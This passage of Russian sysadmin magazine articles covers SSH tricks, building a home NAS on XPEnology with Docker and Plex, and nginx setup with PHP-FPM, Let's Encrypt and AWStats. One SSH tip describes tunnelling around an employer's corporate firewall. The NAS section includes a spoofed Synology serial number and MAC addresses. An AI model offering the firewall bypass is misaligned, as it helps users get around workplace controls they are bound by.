Она будет открывать порт перед SSH-соединением и закрывать его после за-
крытия сессии. Обрати внимание, что по умолчанию в настройках брандмауэ-
ра SSH-порт должен быть закрыт.





                                                              Стучимся в порты

12. ЗАЩИТИСЬ ОТ БРУТФОРСА
Установка fail2ban — второй метод защиты от ботов, подбирающих пароли.
Это демон, который непрерывно мониторит логи различных сетевых служб
(Apache, vsftpd, SSH...) на предмет слишком частых попыток аутентификации
и блокирует IP-адреса тех, кто делает это наиболее активно (три неудачные
попытки подряд — в бан на десять минут).
   Красота fail2ban в том, что он не требует настройки и начинает работать
сразу после установки. Все, что надо сделать, — это инсталлировать пакет:

$ sudo apt-get install fail2ban


13. ИЗМЕРЬ СКОРОСТЬ СОЕДИНЕНИЯ
С помощью SSH легко измерить скорость соединения с машиной. Для этого
можно использовать утилиту pv (pipe viewer). Она предназначена для измере-
ния скорости передачи данных через пайпы (|). Объединив ее с SSH, можно
получить достаточно точный бенчмарк скорости соединения:

$ yes | pv | ssh user@host "cat > /dev/null"




                                              Измеряем скорость соединения


14. ИСПОЛЬЗУЙ SSH КАК SOCKS-ПРОКСИ
SSH очень легко превратить в SOCKS-прокси, который будет пересылать твои
данные между локальной машиной и SSH-сервером через зашифрованный
канал. Все, что для этого нужно сделать, — запустить SSH-клиент с флагом -D,
после которого указать номер SOCKS-порта (флаг -C включает принудитель-
ное сжатие трафика):

$ ssh -D 9999 -C user@host


15. ОБХОДИ ФАЙРВОЛЫ
В дополнение к SOCKS-прокси в SSH есть функция прозрачного «проброса
портов». Работает она так: на локальной машине открывается порт. Трафик,
переданный на этот порт, прозрачно проксируется через удаленную маши-
ну и направляется на указанный хост:порт. Для примера: допустим, твой на-
чальник заблокировал доступ к xakep.ru на уровне корпоративного файрвола.
Но ты можешь обойти это ограничение, используя удаленный SSH-сервер:

$ ssh -L8080:xakep.ru:80 user@host

Теперь  все  подключения  к  localhost:8080  будут  перенаправляться  на
xakep.ru:80.

16. СОХРАНИ НАСТРОЙКИ ПОДКЛЮЧЕНИЯ К ХОСТАМ
Если ты работаешь с большим количеством хостов под именем разных юзеров
с использованием разных ключей, то ты существенно упростишь свою жизнь,
если создашь для этих хостов шорткаты. Например, следующие строки ~/.ssh/
config описывают два хоста:
•  example.com, SSH-сервер на котором «висит» на порту 2222, а в качестве
   ключа используется ~/my_key.pem;
•  192.168.33.10, с SSH-сервером на стандартном порту, юзером root и при-
   нудительным отключением аутентификации с помощью ключа.





Теперь, чтобы подключиться к example.com, нет нужды набирать длинную ко-
манду

$ ssh -i ~/my_key.pem user@example.com -p 2222

Можно использовать шорткат:

$ ssh server1


17. ПОДКЛЮЧАЙСЯ К УДАЛЕННОЙ МАШИНЕ ЧЕРЕЗ ДРУГУЮ
МАШИНУ
Допустим, у тебя есть доступ к host1, но нет доступа к host2 (он за файрволом,
например), но доступ к host2 есть у host1. Тогда подключиться к host2 с твоей
машины можно так:

$ ssh -t user@host1 ssh user@host2


18. КОПИРУЙ ФАЙЛЫ С УДАЛЕННОЙ МАШИНЫ НА ДРУГУЮ
МАШИНУ ЧЕРЕЗ СВОЮ
Примерно такая же история. Предположим, файл необходимо скопировать
с host1 на host2, но они не могут друг с другом общаться. В этом случае файл
можно скопировать через локальную машину:

$ ssh root@host1 "cd /копируемый/каталог/ && tar -cf - ." | ssh
    root@host2 "cd /куда/копировать/ && tar -xf -"


19. ЗАПУСКАЙ ГРАФИЧЕСКИЙ СОФТ
Linux/BSD используют клиент-серверную оконную систему X Window System,
изначально разработанную для запуска графических приложений на мейн-
фрейме с выводом картинки на экран тонкого клиента. Поэтому она из короб-
ки позволяет запускать приложения на удаленной машине так, чтобы их вы-
вод был перенаправлен на локальную. А SSH умеет форвардить протокол X,
так что его можно использовать для запуска не только консольных, но графи-
ческих приложений:

$ ssh -X user@host firefox


20. СЛУШАЙ МУЗЫКУ С УДАЛЕННОЙ МАШИНЫ
Немного надуманный, но в целом довольно интересный трюк:

$ ssh user@host "cat /home/user/music/*.mp3" | mpg123 -

Своего рода интернет-радио для одного.

ВЫВОДЫ
SSH — штука сложная и очень развитая. На самом деле эти двадцать сове-
тов — лишь часть того, на что способен этот инструмент.
UNIXOID
ДОМАШНИЙ
МЕДИАКОМАНДИР





                                                        Александр «Plus» Рак
                                                                    Участник сообщества
                                                          OmskLUG. Руководитель
                                                                группы автоматизации
                                                                 отдела ИТ департамента
                                                                    образования, город
                                                                    Салехард
                                                          plus@omsklug.com


                   СОБИРАЕМ
                  ДОМАШНИЙ
                      NAS-СЕРВЕР
                   С МЕДИА-
                  ПЛЮШКАМИ
                    ДЛЯ ДОМАШНИХ
                    КЛИЕНТОВ



Как ты догадался по названию, сегодня мы будем строить
домашний NAS-сервер. Уже больше пяти лет у меня оби-
тает маленький старенький зверек в корпусе In Win BQ656
Black Mini-ITX 80W USB/Audio/Fan + External remote control.
Внутри у него вот такой процессор: AMD Athlon(tm) Dual
Core Processor 4050e, с показанием BogoMips в 4200. Хоть
и крошка, зато мало ест и умеет виртуализацию, что нема-
ловажно. Подробные характеристики можно посмотреть
где угодно :). К слову, уже после сборки захотелось поме-
нять его на чуть более крутой Athlon 64 X2 6000+. Купить
такой можно на Авито за 500–700 рублей. Все это дело мы
подняли на материнке Minix780G-SP128M.

Не фонтан, конечно, — всего четыре SATA и нет поддержки RAID, но зато ма-
лое энергопотребление. Цену на сегодняшний день определить не удалось,
но когда-то она стоила 220 долларов. В идеале бы, конечно, лучше иметь
мать с возможностью подключения шести дисков и поддержкой RAID. Но та-
кое удовольствие обойдется в некислую сумму. Попробуем прикинуть из того,
что есть на рынке б/у. Предложили комплект на Intel 7600 + мать Asus можно
приобрести за 1500–2000 рублей (напомню, что это б/у).
  До замены корпуса система состояла из Ubuntu-сервера, шары на ней —
и, собственно, все. Внутри было два диска по 500 Гбайт. Сейчас приобретен
новый корпус, установлена еще пара жестких дисков. Итого три HDD по 500
Гбайт и один на 1,5 Гбайт.

ХОТЕЛКИ
Из задач, которые должен решать медиасервер, выделим следующие:
•  само собой, Samba, раздача медиаконтента по сети, об этом чуть ниже;
•  виртуализация различного уровня: пара виртуальных машин, внутри может
   быть 1С-сервер Linux, Docker-контейнеры;
•  чтобы не надо было настраивать каждый домашний узел для сервисов, ма-
   ленький DNS с зоной что-нибудь.local.

Требования к аппаратной части:
•  бесшумность;
•  удобная установка/замена HDD;
•  компактность.

Повторюсь: очень хотелось бы заменить материнскую плату с процессором,
но это не обязательно. Возможно, в дальнейшем заменю только процессор
с кулером. Итак, новый корпус, поиск был долгим и сложным. После недельно-
го гуглинга выбор пал на Raijintek Metis. То, что мне подошло по цене/качеству.

ПАРА ФРАЗ О КОРПУСЕ
Производитель и модель: Raijintek Metis, с окном
Материал: алюминий, сталь
Габариты: 190 x 254 x 277 мм (Ш x В x Г)
Форм-фактор: Mini-ITX
Отсеки накопителей: 1 x 2,5/3,5" (внутри), 2 x 2,5" (внутри)
Вентиляторы: 1 x 120 мм (сзади, предустановлен)
Вес: около 2,8 кг
Классный дизайн и цвет отлично смотрятся практически везде, а стоимость
весьма демократична. К слову, мне такой корпус обошелся всего в 4000 ру-
блей. Приобретался на Avito, доставка почтой. Подробнее с корпусом можно
познакомиться на сайте производителя. Чуть не забыл про память! На момент
написания статьи было установлено 2 Гбайт (две планки по 1 Гбайт). Сейчас
уже заказываю две плашки по 2 Гбайт.

РЕАЛИЗАЦИЯ ПРОГРАММНОЙ ЧАСТИ
Итак, что самое главное хочется от сервера? Чтобы был легко масштабируе-
мый, в ногу со временем, приятый и удобный в использовании/администриро-
вании. Желательно привлекательная веб-морда.
• Вариант 1: поставить Ubuntu Server c панелью управления Ajenty 2 и все
   необходимое доставлять руками.
• Вариант 2: поставить OpenMediaVault. Морда в наличии, много плагинов/
   расширений для увеличения функциональности, в основе лежит Debian, со-
   ответственно, всегда есть возможность доставить или допилить руками.
• Вариант 3: поставить FreeNAS. Чуть меньше плюшек, но можно доставить
   все руками, правда — чуть сложней. Базируется на FreeBSD.
• Вариант 4: поставить XPEnology. Огромное количество плюшек, репозито-
   риев с дополнениями. Поддержка виртуальных машин и Docker.

После долгих мучений выбор пал на четвертый вариант. На нем и будем под-
нимать домашний сервер далее. Почему именно так? Первый вариант хорош
сам по себе, но в то же время хочется минимум усилий и максимум возмож-
ностей без дополнительного рукоприкладства. К тому же Ajenty не дает гиб-
ко обращаться к серверу, так и хочется залезть в консоль и сделать все рука-
ми оттуда. А потом зайти в панель и просто любоваться :). Среди оставшихся
вариантов победу одержал XPEnology. Предоставляет максимум сервисов
при минимуме настроек.

ВЗЛЕТАЕМ
Итак, перво-наперво идем на сайт xpenology.me в раздел
downloads и скачиваем набор для развертывания.
   XPEnoboot — это образ загрузочного диска для установ-
ки и загрузки/перезагрузки сервера.
  DSM — сама система. Synology Assistant — опциональ-
но, программа обнаруживает серверы XPEnology/Synology,    WWW
установленные или готовые к установке узлы. Я устанавли-                                                                                  XPEnology
вал через веб-интерфейс — как говорится, на вкус и цвет
все фломастеры разные.                                                  XPEnoboot
                                                                            DS3615xs 5.2-   ISO-образ нужно распаковать на флешку и использовать
                                                                                  5644.4 ISO
при каждом перезапуске сервера, что не совсем удобно.
Либо подарить флешку серверу и сделать ее приоритетной      DSM_5.2-5644
при загрузке. Есть второй путь. В предыдущих выпусках жур-
нала «Хакер» я писал про организацию PXE-сервера с различными вариан-
тами загрузки. Если есть такой сервис, то можно с легкостью отдать это ему.
За загрузку в XPEnology отвечают два файла (как и в любом линукс-дистрибу-
тиве): zImage и rd.gz. Располагаем их в директории PXE-сервера, в меню до-
писываем:

insert into pxelinux.cfg/default
LABEL xpenolog
kernel xpenology/zImage root=/dev/md0 ihd_num=0 netif_num=2
    syno_hw_version=RS3612xs ac1=0010562E3E36 mac1=0051562E3E37
    sn=B5JDN10005
initrd xpenology/rd.gz

Из меню понятно расположение файлов в подкаталоге xpenology, относитель-
но корня TFTP-сервера. Информация была найдена на сайте xpenology.com.
Рекомендую ознакомиться.
   Первый вариант не сработал. Пробую по-другому. Распаковываю ISO, беру
оттуда файл меню isolinux.cfg, копирую менюшку в свое меню PXE, с поправкой
пути до файла ядра zImage. Копирую zImage на PXE-сервер. Вот этот вариант
сработал как надо, после начала установки даже pat-файл операционной систе-
мы не потребовался. Сервер сам скачал его с сайта synology.com, что не может
не улыбнуть :). В процессе установки сервер попросит ввести учетные данные
администратора. После установки получаем полностью готовый к работе сер-
вер Synology на обычном железе. Тем, кто не знаком с этой ОС, очень рекомен-
дую! Огромное сообщество. Как результат — большое количество репозитори-
ев, которые в разы расширяют штатную функциональность.
   Рекомендую следующие списки репозиториев:
1. http://www.cphub.net/index.php?id=37
2. http://spk.unzureichende.info/
3. http://synology.sysco.ch/
4. http://packages.jdel.org/
5. http://spk.naefmarco.ch/spkrepo/packages/
6. http://repo.synozwave.com/
7. http://spk.nas-mirror.de/spkrepo/packages
8. http://spk.synologyitalia.com
9.  http://jaspr.kastner.wtf
10. http://packages.pcloadletter.co.uk
11. http://www.cphub.net
12. http://synology.sysco.ch
13. http://synology.acmenet.ru
14. https://packages.synocommunity.com
15. https://synocommunity.com/packages

На всякий случай ко всему нужно иметь рабочую систему Ubuntu Server. Поэ-
тому первым делом ставлю Docker и добавляю контейнер Ubuntu.





                                        Меню с приложениями XPEnology

Если нужна виртуализация, в XPEnology есть VirtualBox. Кто хочет Archipel, есть
Docker (ссылка для любителей CentOS). Понятно, что внутри хоть KVM, хоть
еще что можно крутить. У меня таким образом в Ubuntu-контейнере крутится
веб-клиент uTorrent.
   Вот так легко и непринужденно управляем контейнерами в XPEnology.





                                 Скриншот работы Docker-контейнера в XPEnology

Из центра пакетов следом за «Докером» рекомендую подборку:
• DNS Server (для настройки домашней зоны, опционально);
•  Plex Media Server;
• DLNA Server (опционально, в Plex’е уже есть);
•  Download Station — менеджер закачек на самом сервере;
•  MariaDB;
• PHP PEAR;
•  Midnight Commander;
•  phpMyAdmin;
•  Transmission;
•  VirtualBox;
•  Tor;
•  Python;
•  антивирус на выбор.

НАСТРОЙКА DNS
Открываем DNS Server во вкладке «Зоны», сразу жмем «Создать», «Основная
зона», вводим имя зоны. Далее двойным кликом открываем и вносим необхо-
димые записи.





                                           Пример настройки DNS в XPEnology

Далее открываем вторую вкладку «Разрешение». Включаем службы разреше-
ния. Включаем серверы пересылки и вводим адреса вышестоящих DNS-сер-
веров, к которым следует обращаться, если в своей базе данные отсутствуют.
На очередной вкладке можно посмотреть журнал, а на следующей — создать
ключи. Далее вкладка «Представление». Переходим и создаем запись. При-
оритет будет выставляться в порядке создания. Далее вводим имя представ-
ления, есть опция ограничения IP-служб. Для настройки отдельных серверов
пересылки переходим во вкладку «Выберите зону» и выбираем нужные зоны
для этой записи. В последней вкладке, «Настройки», можно настроить размер
журнала, TTL кеша, кеш, число рекурсивных клиентов и максимальное число
TCP-подключений.
  Следующим шагом нужно автоматизировать скачивание сериалов с от-
слеживанием новых версий и последующей передачей медиа Plex-серверу.
Для этого нужен веб-сервер, который уже предусмотрен в DSM, торрент-ка-
чалка  Transmission с веб-интерфейсом:  того,  что сериалы мониторятся
и скачиваются автоматически, точно окажется мало — обязательно возник-
нет необходимость скачать еще какой-нибудь торрент. И собственно сам
TorrentMonitor, написанный на PHP. У этого приложения очень хороший набор
функций при минимальной нагрузке на сервер. TorrentMonitor позволяет мони-
торить не только сериалы на популярных трекерах, но и раздачи с таких серви-
сов, как rutor.is или rutracker.org. У проекта есть живой сайт и форум, на кото-
ром можно довольно быстро получить консультацию, если что-то пошло не так.
   Хочется выразить огромную благодарность разработчику. В общем, очень
полезная штуковина. Рекомендую!
   Ради самообразования поставим к Transmission еще uTorrent-веб, пусть
TorrentMonitor грузит через Transmission, а для админских качалок без ограни-
чений будем качать uTorrent’ом.





                                                                         TorrentMonitor

Итак,  для  всяких  веб-приложений,  включая  TorrentMonitor,  подготовим
веб-службы с виртуальными узлами.
  Идем в «Панель управления», раздел «Веб-службы». Включаем Web Station.
Добавляем виртуальные хосты. Указываем имя каталога, имя хоста, протокол
и порт. Указанное имя каталога создается по следующему пути: /web/имя_ка-
талога. Поскольку сервер домашний, то с HTTPS не буду заморачиваться,
но для особо искушенных такая возможность есть и при желании включается
в пару кликов.
   TorrentMonitor распаковываем в соответствующий хост, у меня это torrent.
homeserver.local, имя каталога tm-latest. Не заморачивался особо, распаковал
архив с TorrentMonitor’ом и прямо эту папку указал в virtual host. Настраиваем
БД по желанию. В моем варианте MariaDB-server + phpMyAdmin, оба пакета
устанавливаются из центра приложений XPEnology. Для особо экзотических
есть SQLite, меня, правда, производительность не устроила. Как работать
с phpMyAdmin, информации в интернетах полно, поэтому не буду заострять
внимание.
  На самом деле там все просто. Заводим аккаунты на поддерживаемых тре-
керах. Указываем параметры подключения к торрент-клиенту. И наконец, до-
бавляем сериал для мониторинга, выбираем директорию скачивания, и все
готово. В программе есть тест на работоспособность. Повторюсь, что в целом
очень легко настраивается.
  С этим разобрались, переходим к uTorrent WebUI. Здесь можно пойти тем
же путем. А можно поднять контейнер с Ubuntu 14.04 в Docker и запустить вну-
три uTorrent WebUI, что я и сделаю.





                                                    Интерфейс uTorrent WebUI

Итак, ставим Docker из «Центра приложений». После запуска переходим
в «Реестр». Ищем Ubuntu, ставим понравившийся образ, я выбрал widerplan/
ubuntu-14.04. При запуске подключаем общий том с хостовой системой и нуж-
ные порты, выбрал 2222-й для SSH, 8088-й для 80 и 8080-й — на нем будет
работать uTorrent WebUI.





                                  Docker-контейнер с указанием подключения томов





                                 Docker-контейнер с указанием подключения портов





                                         Консоль управления в контейнере Ubuntu

Далее заходим по SSH и качаем архив с сайта TorrentMonitor.
   Распаковываем по пути /var/www/html/utorrent. Ставим LAMP, правим
конфиги Apache 2. Все это сто раз рассказано в интернетах, поэтому труд-
ностей возникнуть не должно. Итак, торренты качаются, сериалы мониторят-
ся. Теперь надо бы все это дело более-менее прилично раздавать по сети.
В качестве медиасервера будем использовать Plex Media Server. Преиму-
ществ масса. Самое главное — сам сканирует папки, качает обложки, сорти-
рует сериалы по сезонам и сериям, музыку по исполнителям и альбомам. Ка-
чает к фильмам трейлеры, описание, список актеров, рейтинги. И это далеко
не предел. Внутри из коробки доступен DLNA, но использовать в качестве
DLNA-сервера мы будем внешний. Устанавливаем его также из «Центра при-
ложений». Если позволяет сеть, то можно организовать доступ к Plex-серверу
извне, что сделает его доступным из сети Интернет, и ты сможешь делиться
медиатекой с друзьями. Клиентские приложения есть практически под любое
устройство.





                                        Пример веб-клиента Plex Media Server

После установки Plex’a добавляем каталоги с указанием содержимого. От-
дельно рекомендую указать папку, в которую скачиваются торренты по умол-
чанию, а также добавить каталоги, куда скачивание идет через TorrentMonitor.
Когда количество контента перевалит уже за терабайт, будет проще разби-
раться с файлами, чем искать все в «файлопомойке».

ЗАКЛЮЧЕНИЕ
Конечно, это далеко не предел для такой системы, как DSM (XPEnology). Здесь
можно наворотить и мониторинг, и Proxy, и сервер резервного копирования
как для обычных систем, так и для Apple-устройств. На лету можно установить
CMS-ки, такие как площадка DokuWiki, Joomla, форум PHPBB, Drupal, BitTorrent
Sync, IP-телефонию Asterisk, UniFI, VirtualBox и еще очень много всего. Воз-
можности этой системы просто поражают именно потому, что все сделано
с красивыми рюшечками и кнопочками в интерфейсе.
  В общем, если нужно на лету быстро расширить функциональность, это
не составит проблем. Для домашнего сервера очень даже то. Правда, не у каж-
дого есть дома PXE, поэтому рекомендую приобрести маленькую флешку и за-
пихать загрузчик на нее. В общем, удачи в установках, если что — пиши на по-
чту, всегда рад помочь!
   P. S. Надеюсь, ты не потратил время зря ;). Всем спасибо. :)
SYNACK
ПРОСТО
О СЛОЖНОМРАЗБИРАЕМ НЕСТАНДАРТНЫЕ
ВАРИАНТЫ НАСТРОЙКИ NGINX





                                                 Мартин
                                                                  «urban.prankster»
                                                   Пранкевич
                                                         prank.urban@gmail.com





Nginx сегодня становится все более популярным, он бы-
стрее и легче Apache. Но вот подходы к настройкам
у Apache и nginx настолько различаются, что при перено-
се установок по аналогии делаешь обычно все напрямую,
а в итоге все получается очень сложно: оно не работает
или работает еще хуже. Между тем nginx отлично ладит
со всеми CMS, на сайтах доступны инструкции по на-
стройке под самые разные случаи, но в нестандартных си-
туациях приходится немного повозиться.


ЗАПУСК САЙТОВ ОТ РАЗНЫХ ПОЛЬЗОВАТЕЛЕЙ В СВЯЗКЕ
NGINX + PHP-FPM
Сегодня нередко берут VDS в складчину и на одном сервере размещают свои
сайты несколько пользователей. В итоге получается дешевле при большей
суммарной мощности сервера на один сайт. Или как вариант: к серверу, по-
мимо админа, нужен доступ разработчику для сопровождения сайта. Осталось
обеспечить всем возможность доступа только к своим файлам, но таким обра-
зом, чтобы пользователи не могли прочитать файлы друг друга.
   Если физический доступ к файлам легко настраивается с помощью стан-
дартной системы прав *nix и домашних каталогов, то с веб-сайтами чуть слож-
нее. В Apache для решения этой задачи прибегают к suEXEC или suPHP, ко-
торые позволяют запускать процессы от имени нужной учетной записи.
При установке стандартной связки LEMP используется один пул PHP-FPM, об-
рабатывающий все PHP-скрипты для всех сайтов от имени одной учетной за-
писи (обычно совпадающей с той, под которой работает веб-сервер).
   Это создает несколько проблем. Пользователи не могут нормально и без-
опасно работать только со своими сайтами, ведь для доступа придется вклю-
чать всех в группу веб-сервера. Даже с очень строгими ограничениями в этом
случае можно получить доступ ко всем сайтам. Если нельзя напрямую зайти
в каталог, то делается симлинк на своем сайте, и можно читать чужие файлы
через веб-сервер. Скомпрометированный сайт может служить проблемой
для всех остальных приложений на этом сервере. Зараженные мини-хостин-
ги — это, поверь, далеко не редкость. Хакер, взломав один, может получить
доступ к файлам конфигурации и БД абсолютно всех.





                          Документация nginx часто дает ответы на нужные вопросы


При использовании nginx доступ разграничивают, создавая отдельные PHP-
FPM-пулы для каждого пользователя. Процесс при этом запускается с пра-
вами конкретного пользователя, и он будет без проблем редактировать свои
файлы в FTP-клиенте, не рискуя, что кто-то еще может к ним подобраться.
Создаем учетную запись и подкаталоги для работы:

$ sudo adduser example
$ mkdir -p /home/example/example.org/{tmp,logs}

Единственный момент: если используются домашние каталоги пользователей,
то веб-сервер и PHP должны получать доступ на чтение списка файлов и к ка-
талогам выше (как минимум право на выполнение — х). Традиционно пулы PHP
располагаются в каталоге /etc/php5/fpm/pool.d. Сам каталог подключается
в /etc/php5/fpm/php-fpm.conf инструкцией include (она бывает закоммен-
тирована):

include=/etc/php5/fpm/pool.d/*.conf

После установки внутри обычно находится один файл www.conf, настройки ко-
торого и используются всеми процессами. Его можно взять как шаблон, ско-
пировав и изменив параметры:

$ cd /etc/php5/fpm/pool.d
$ sudo cp www.conf example.org.conf

Правим под новый сайт:

$ sudo nano example.org.conf





И при необходимости указываем специфические для сайта установки PHP:





                                                    Настраиваем пул PHP-FPM

Теперь процесс фактически заперт внутри каталога, с четко установленными
правами. Все параметры файла можно найти в документации.
   Настройки сайта для nginx в целом стандартные. Необходимо лишь указать
сокет, который будет использоваться для обработки PHP:

$ sudo /etc/nginx/sites-available/example.org.conf





$ ln -s sudo /etc/nginx/sites-available/example.org.conf
    /etc/nginx/sites-enabled/example.org.conf

Перезапускаем PHP-FPM и nginx:

$ sudo /etc/init.d/php5-fpm restart
$ sudo /etc/init.d/nginx reload

Если вместо сокета нужно использовать сетевое соединение, то для каждого
пула указывается отдельный сетевой порт:

$ sudo nano example.org.conf





$ sudo /etc/nginx/sites-available/example.org.conf





Осталось залить на сервер файлы и установить права: 640 на файлы и 750
на каталог.

САЙТ WORDPRESS В ПОДПАПКЕ ДОМЕНА NGINX
Нередко портал использует несколько CMS, доступ к которым организо-
ван из меню Landing Page. При размещении в поддомене с ссылкой вроде
blog.example.org проблем нет, настраивается это стандартными правилами.
А в случае использования подкаталога (http://example.org/blog) стандарт-
ные установки уже не подходят. Разберем на примере WordPress. В инструк-
ции на сайте WP при таком расположении предлагается переместить index.
php и .htaccess из каталога с WordPress в корневой каталог сайта и указать
в index.php новое расположение сайта. Вместо

require('./wp-blog-header.php');

вписать новый путь:

require('./blog/wp-blog-header.php');

Загвоздка в том, что в корневом каталоге уже может быть такой файл от ос-
новного сайта или нужно подключать несколько CMS со своими ссылками.
В Apache это не проблема, а вот в nginx придется чуть отойти от стандартной
конфигурации.
  В начале идет основной сайт. Здесь все как обычно:





Блог на WP к основному сайту подключается как location. В параметре root ука-
зываем полный путь к каталогу. В случае nginx нет ничего плохого в размеще-
нии root-каталога внутри location. Для проверки наличия файлов в nginx есть
очень полезная инструкция try_files, которая просматривает существование
файлов в указанном порядке и при первом совпадении использует его для об-
работки. Обработка делается в контексте этого же location в соответствии
с директивами root и alias. Если в конце имени указать слеш, то проверяется
каталог (например, $uri/). Если совпадения не найдены, то делается внутрен-
нее перенаправление на uri, заданное последним параметром.
   Переменная $uri, используемая в конфигурации, указывает на текущий URI
запроса в нормализованном виде, при обработке запроса его значение мо-
жет изменяться. $uri вообще очень полезная директива, при помощи которой
можно перенаправлять запросы, блокировать доступ к файлам, перенаправ-
лять на 404, если файла нет, и многое другое.





Если сайт расположен в пределах корневого каталога веб-сайта, такая схе-
ма работает без проблем. Но если location находится вне корневого каталога
веб-сервера (что, кстати, очень не рекомендуют сами разработчики), то у него
не будет доступа к корневому каталогу. То есть описанная конфигурация ра-
ботать не станет. Например, не будут грузиться картинки или стили, и нужно
дополнительно указать веб-серверу, где их искать.
   Основная часть кода остается без изменений, правим только ту, что каса-
ется самого блога:





ВКЛЮЧАЕМ SSL
Не так давно использование SSL-шифрования считалось просто фишкой от-
дельных сайтов и применялось только на тех ресурсах, где в этом действи-
тельно была необходимость. Теперь это уже почти обязательное требование.
Google, например, повышает в рейтингах сайты с включенным SSL, поэтому
сегодня все больше владельцев переводят свои ресурсы на этот протокол.
   Сгенерировать сертификат можно и самому:

$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout
    /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt

Только вот самоподписанный сертификат будет, наоборот, отпугивать посети-
телей сообщением браузера о том, что владельца проверить нельзя. Поэтому
такой вариант подходит больше для внутренних ресурсов.
   Сертификат можно купить. Некоторые хостеры дают его «бесплатно»
в старших тарифных планах. Но есть еще один вариант: относительно моло-
дой проект Let’s Encrypt предлагает бесплатно общедоступные сертификаты,
которым доверяют большинство браузеров и которые позволяют получить вы-
сокий рейтинг на Qualys SSL и securityheaders.io. Плюс инструменты для соз-
дания и обновления сертификатов. Но проект имеет два ограничения: серти-
фикат действителен 90 дней и для домена нельзя запрашивать больше пяти
сертификатов в неделю.
   Разберемся, как установить и настроить Let’s Encrypt и подключить серти-
фикат к nginx. В некоторых дистрибутивах уже есть нужный пакет.

$ sudo apt-get install letsencrypt

Если нет, то забираем последнюю версию при помощи Git:

$ sudo apt-get install git bc
$ sudo git clone https://github.com/letsencrypt/letsencrypt
    /opt/letsencrypt

Запускаем создание сертификата, указав имя домена и каталог, в котором
размещаются файлы. В Ubuntu команда выполняется без sudo:

$ cd /opt/letsencrypt
$ export DOMAINS="example.org,www.example.org"
$ ./letsencrypt-auto certonly -a webroot --webroot-path=/var/www/
    example.org -d $DOMAINS

Теперь вводим пароль root. После установки дополнительных пакетов будет
запрошен email для восстановления ключей и инфосообщений проекта. Под-
тверждаем условия использования. По окончании в /etc/letsencrypt будет
создан подкаталог с сертификатами домена (в примере live/example.org).
   Для повышения уровня безопасности с Perfect forward secrecy желательно
создать 2048-битный ключ по алгоритму Диффи — Хеллмана (это может за-
нять время):

$ sudo openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048

Теперь подключаем SSL в nginx. В самом простом случае сайт будет поддер-
живать оба варианта: без HTTPS или с HTTPS.





Проверяем корректность конфигурационного файла и перезапускаем nginx.

$ sudo nginx -t && sudo nginx -s reload

И проверяем, зайдя по HTTPS. Можно расширить эту схему. Например, ис-
пользование стандарта HTTP/2, если его поддерживает клиент:


Разрешаем использование более защищенного TLS, убрав менее безопас-
ные SSLv2/SSLv3. Но это отсеет клиентов, работающих под старыми версиями
ОС. TLSv1 будет поддерживаться до середины 2018 года.


Указываем список алгоритмов шифрования:





Использование для проверки статуса SSL-сертификата протокола OCSP
(Online Certificate Status Protocol), обеспечивающего более быструю проверку:



Кеширование параметров сессии:



и так далее.
   Если нужно, чтобы сайт отвечал после установки сертификата только
на 443-м порту, то настраиваем редирект. Обычно пишут так:





Но лучше использовать переменную $scheme, указывающую на протокол:





Сертификаты на сервере обновляются командой

$ /opt/letsencrypt/letsencrypt-auto renew

Первый раз ее можно выполнить вручную, чтобы проверить работоспособ-
ность. Затем добавляем задание в cron.





                                                        Генерируем сертификат





                                            Проверка сертификата на Qualys SSL

НАСТРОЙКА AWSTATS
Одно из наиболее популярных средств получения информации о посетите-
лях — Perl-скрипт AWStats. Периодически просматривая журналы веб-серве-
ра, он генерирует HTML-отчеты. Проблема в том, что изначально он хорошо
ставится под Apache или lighttpd. Для nginx необходимо немного понастраи-
вать. Устанавливаем:

$ sudo apt install awstats

Базовая настройка AWStats стандартна. Создаем копию шаблона с именем,
соответствующим веб-сайту:

$ sudo cp /etc/awstats/awstats.conf /etc/awstats/awstats.
    example.org.conf

Отредактируем под наш сайт, указав домен, файл журнала и куда складывать
статистику:

$ sudo nano /etc/awstats/awstats.example.org.conf





Создадим каталог для статистики:

$ sudo mkdir -p /var/www/example.org/awstats

Сгенерируем первый отчет. В принципе, это необязательно, но, так как он мо-
жет занять некоторое время, лучше первый раз выполнить это вручную и по-
смотреть на вывод, на наличие ошибок.

$ sudo /usr/lib/cgi-bin/awstats.pl -update -config=example.org

В Ubuntu при установке из пакетов уже есть cron-задание для периодического
сбора статистик со всех возможных хостов, описанных в /etc/awstats, и рота-
ции журналов. Обычно больше ничего для настройки AWStats делать не нужно.
Для работы AWStats в nginx нам понадобится FastCGI-модуль для Perl:

$ sudo apt install libfcgi-perl -y

Скачиваем готовый FastCGI-враппер для запуска Perl-сценариев и init-скрипт:

$ sudo wget http://nginxlibrary.com/downloads/perl-fcgi/
    fastcgi-wrapper -O /usr/bin/fastcgi-wrapper.pl
$ sudo wget http://nginxlibrary.com/downloads/perl-fcgi/
    perl-fcgi -O /etc/init.d/perl-fcgi

Делаем файлы исполняемыми:

$ chmod +x /usr/bin/fastcgi-wrapper.pl
$ chmod +x /etc/init.d/perl-fcgi

В зависимости от дистрибутива потребуется отредактировать  init-скрипт.
В Ubuntu вместо su нужно использовать sudo. То есть вместо

su - $FASTCGI_USER -c $PERL_SCRIPT

пишем

sudo -u $FASTCGI_USER $PERL_SCRIPT

Это можно сделать в редакторе или выполнив следующую команду:

$ sudo sed -i -e 's/su\ -/sudo\ -u/g' -e '/sudo/s/-c\ //g'
    /etc/init.d/perl-fcgi

Ставим на автозапуск и запускаем:

$ sudo update-rc.d perl-fcgi defaults
$ sudo service perl-fcgi start

Враппер perl-fcgi будет принимать соединения на 8999-м порту. Его можно из-
менить, установив другое значение в строке:


Проверяем, чтобы порт слушался:

$ netstat -anp | grep -i 8999

Указываем nginx в настройках сайта, как обрабатывать pl-файлы:





Можно для статистик сделать свой поддомен, но чаще используют подкаталог.
Добавляем location для файлов AWStats:





Проверяем корректность конфигурационного файла и перезапускаем nginx:

$ sudo nginx -t && sudo nginx -s reload

После этого статистика будет доступна по адресу http://example.org/
awstats/awstats.pl?config=example.org.





                                                     Настройка AWStats в nginx





                                                                  Отчет AWStats
ЗАКЛЮЧЕНИЕ
На самом деле в nginx некоторые вещи настраиваются даже проще и легче,
чем в Apache. Нужно только привыкнуть.
SYNACK
ИДЕАЛЬНЫЙ


ПОЧТОВЫЙ СЕРВЕР
        ПРОБУЕМ НЕ ОГРЕСТИ
         ОТ СПАМ-ФИЛЬТРОВ





                                           Мартин
